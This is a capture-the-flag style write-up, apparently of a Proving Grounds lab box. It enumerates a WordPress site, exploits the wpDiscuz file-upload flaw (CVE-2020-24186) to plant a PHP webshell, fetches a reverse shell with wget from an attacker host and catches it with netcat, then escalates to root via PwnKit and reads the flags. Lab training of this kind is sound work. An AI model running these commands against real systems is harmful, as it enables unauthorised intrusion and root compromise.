`Running all scans on 192.168.236.217`

`Host is likely running Unknown OS!`

`---------------------Starting Port Scan-----------------------`

`PORT   STATE SERVICE`
`22/tcp open  ssh`
`80/tcp open  http`

Nothing really of interest on the main page besides the username james.

Ferox it
```
feroxbuster --url http://blogger.pg/ --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -r -o ferox_scan.txt -t 100
```

![[ferox_scan 1.txt]]

From this we can tell there is a wordpress instance at http://blogger.pg/assets/fonts/blog/

WPscan it
```
wpscan --url http://blogger.pg/assets/fonts/blog --api-token <api key> --plugins-detection aggressive
```

Under the scan results, we can see a plugin with a ton of vulnerabilities
```
[i] Plugin(s) Identified:

[+] akismet
 | Location: http://blogger.pg/assets/fonts/blog/wp-content/plugins/akismet/
 | Last Updated: 2024-01-17T22:32:00.000Z
 | Readme: http://blogger.pg/assets/fonts/blog/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 5.3.1
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://blogger.pg/assets/fonts/blog/wp-content/plugins/akismet/, status: 200
 |
 | Version: 4.0.8 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://blogger.pg/assets/fonts/blog/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://blogger.pg/assets/fonts/blog/wp-content/plugins/akismet/readme.txt

[+] wpdiscuz
 | Location: http://blogger.pg/assets/fonts/blog/wp-content/plugins/wpdiscuz/
 | Last Updated: 2024-02-03T19:27:00.000Z
 | Readme: http://blogger.pg/assets/fonts/blog/wp-content/plugins/wpdiscuz/readme.txt
 | [!] The version is out of date, the latest version is 7.6.15
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://blogger.pg/assets/fonts/blog/wp-content/plugins/wpdiscuz/, status: 200
 |
 | [!] 15 vulnerabilities identified:
 |
 | [!] Title: Comments - wpDiscuz 7.0.0 - 7.0.4 - Unauthenticated Arbitrary File Upload
 |     Fixed in: 7.0.5
 |     References:
 |      - https://wpscan.com/vulnerability/92ae2765-dac8-49dc-a361-99c799573e61
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-24186
 |      - https://www.wordfence.com/blog/2020/07/critical-arbitrary-file-upload-vulnerability-patched-in-wpdiscuz-plugin/
 |      - https://plugins.trac.wordpress.org/changeset/2345429/wpdiscuz
 |
 | [!] Title: Comments - wpDiscuz < 7.3.2 - Admin+ Stored Cross-Site Scripting
 |     Fixed in: 7.3.2
 |     References:
 |      - https://wpscan.com/vulnerability/f51a350c-c46d-4d52-b787-762283625d0b
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24737
 |
 | [!] Title: wpDiscuz < 7.3.4 - Arbitrary Comment Addition/Edition/Deletion via CSRF
 |     Fixed in: 7.3.4
 |     References:
 |      - https://wpscan.com/vulnerability/2746101e-e993-42b9-bd6f-dfd5544fa3fe
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24806
 |      - https://www.youtube.com/watch?v=CL7Bttu2W-o
 |
 | [!] Title: wpDiscuz < 7.3.12 - Sensitive Information Disclosure
 |     Fixed in: 7.3.12
 |     References:
 |      - https://wpscan.com/vulnerability/027e6ef8-39d8-4fa9-957f-f53ee7175c0a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23984
 |
 | [!] Title: wpDiscuz < 7.6.4 - Unauthenticated Data Modification via IDOR
 |     Fixed in: 7.6.4
 |     References:
 |      - https://wpscan.com/vulnerability/d7de195a-a932-43dd-bbb4-784a19324b04
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-3869
 |
 | [!] Title: wpDiscuz < 7.6.4 - Post Rating Increase/Decrease iva IDOR
 |     Fixed in: 7.6.4
 |     References:
 |      - https://wpscan.com/vulnerability/051ab8b8-210e-48ac-82e7-7c4a0aa2ecd5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-3998
 |
 | [!] Title: wpDiscuz < 7.6.12 - Unauthenticated Stored XSS
 |     Fixed in: 7.6.12
 |     References:
 |      - https://wpscan.com/vulnerability/f061ffa4-25f2-4ad5-9edb-6cb2c7b678d1
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-47185
 |
 | [!] Title: wpDiscuz < 7.6.6 - Unauthenticated SQL Injection
 |     Fixed in: 7.6.6
 |     Reference: https://wpscan.com/vulnerability/ebb5ed9a-4fb2-4d64-a8f2-6957878a4599
 |
 | [!] Title: wpDiscuz < 7.6.4 - Author+ IDOR
 |     Fixed in: 7.6.4
 |     References:
 |      - https://wpscan.com/vulnerability/d5e677ef-786f-4921-97d9-cbf0c2e21df9
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-46311
 |
 | [!] Title: wpDiscuz < 7.6.11 - Unauthenticated Content Injection
 |     Fixed in: 7.6.11
 |     References:
 |      - https://wpscan.com/vulnerability/8c8cabee-285a-408f-9449-7bb545c07cdc
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-46310
 |
 | [!] Title: wpDiscuz < 7.6.11 - Insufficient Authorization to Comment Submission on Deleted Posts
 |     Fixed in: 7.6.11
 |     References:
 |      - https://wpscan.com/vulnerability/874679f2-bf44-4c11-bc3b-69ae5ac59ced
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-46309
 |
 | [!] Title: wpDiscuz < 7.6.12 - Missing Authorization in AJAX Actions
 |     Fixed in: 7.6.12
 |     References:
 |      - https://wpscan.com/vulnerability/2e121d4f-7fdf-428c-8251-a586cbd31a96
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-45760
 |
 | [!] Title: wpDiscuz < 7.6.12 - Cross-Site Request Forgery
 |     Fixed in: 7.6.12
 |     References:
 |      - https://wpscan.com/vulnerability/f8dfcc13-187c-4a83-a87e-761c0db4b6d9
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-47775
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/53af9dfd-eb2d-4f6f-b02f-daf790b95f1f
 |
 | [!] Title: wpDiscuz < 7.6.6 - Unauthenticated SQL Injection
 |     Fixed in: 7.6.6
 |     References:
 |      - https://wpscan.com/vulnerability/a2fec175-40f6-4a80-84ed-5b88251584de
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/9dd1e52c-83b7-4b3e-a791-a2c0ccd856bc
 |
 | [!] Title: wpDiscuz < 7.6.13 - Admin+ Stored XSS
 |     Fixed in: 7.6.13
 |     References:
 |      - https://wpscan.com/vulnerability/79aed6a7-a6e2-4429-8f98-ccac6b59fb4d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-51691
 |      - https://patchstack.com/database/vulnerability/wpdiscuz/wordpress-wpdiscuz-plugin-7-6-12-cross-site-scripting-xss-vulnerability
 |
 | Version: 7.0.4 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://blogger.pg/assets/fonts/blog/wp-content/plugins/wpdiscuz/readme.txt
```

![[Pasted image 20240227205421.png]]

```
python 49967.py -u http://blogger.pg/assets/fonts/blog/ -p 'index.php?p=1'
---------------------------------------------------------------
[-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution
[-] File Upload Bypass Vulnerability - PHP Webshell Upload
[-] CVE: CVE-2020-24186
[-] https://github.com/hevox
--------------------------------------------------------------- 

[+] Response length:[55908] | code:[200]
[!] Got wmuSecurity value: 1b83989174
[!] Got wmuSecurity value: 1 

[+] Generating random name for Webshell...
[!] Generated webshell name: ijyjhchztnvmirp

[!] Trying to Upload Webshell..
[+] Upload Success... Webshell path:url&quot;:&quot;http://blogger.pg/assets/fonts/blog/wp-content/uploads/2024/02/ijyjhchztnvmirp-1709085237.5993.php&quot; 

> whoami

[x] Failed to execute PHP code...
```

But if we take this URL and do manual execution, we get RCE
![[Pasted image 20240227205529.png]]

Download Pentest monkey's PHP reverse shell - https://github.com/pentestmonkey/php-reverse-shell - and update the IP and port in it.

Transfer this over
`http://blogger.pg/assets/fonts/blog/wp-content/uploads/2024/02/nkdhogesenupcka-1709083519.5384.php?cmd=wget 192.168.45.222/rev.php`

Setup the listener
`nc -nlvp 4444`

Run it
`http://blogger.pg/assets/fonts/blog/wp-content/uploads/2024/02/nkdhogesenupcka-1709083519.5384.php?cmd=php%20rev.php`

```
Ncat: Connection from 192.168.236.217:36604.
Linux ubuntu-xenial 4.4.0-210-generic #242-Ubuntu SMP Fri Apr 16 09:57:56 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 01:33:42 up 45 min,  0 users,  load average: 0.00, 0.00, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
/bin/sh: 1: python: not found
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu-xenial:/$ 
```

Run lse_cve.sh
```
[!] cve-2021-4034 Checking for PwnKit vulnerability........................ yes!
```

Give PwnKit.sh a try
```
www-data@ubuntu-xenial:/tmp$ wget 192.168.45.222/PwnKit.sh
wget 192.168.45.222/PwnKit.sh
--2024-02-28 01:39:14--  http://192.168.45.222/PwnKit.sh
Connecting to 192.168.45.222:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 150 [text/x-sh]
Saving to: 'PwnKit.sh'

PwnKit.sh           100%[===================>]     150  --.-KB/s    in 0s      

2024-02-28 01:39:14 (26.1 MB/s) - 'PwnKit.sh' saved [150/150]

www-data@ubuntu-xenial:/tmp$ chmod +x PwnKit.sh
chmod +x PwnKit.sh
www-data@ubuntu-xenial:/tmp$ ./PwnKit.sh
./PwnKit.sh
root@ubuntu-xenial:/tmp# 
```

Get the flags
`root@ubuntu-xenial:/tmp# cat /root/proof.txt`
`cat /root/proof.txt`
`87d74df75b347f155a73bf217ad81a41`
`root@ubuntu-xenial:/tmp# cat /home/james/local.txt`
`cat /home/james/local.txt`
`f90805ba36984ca6e9fdf773eab56003`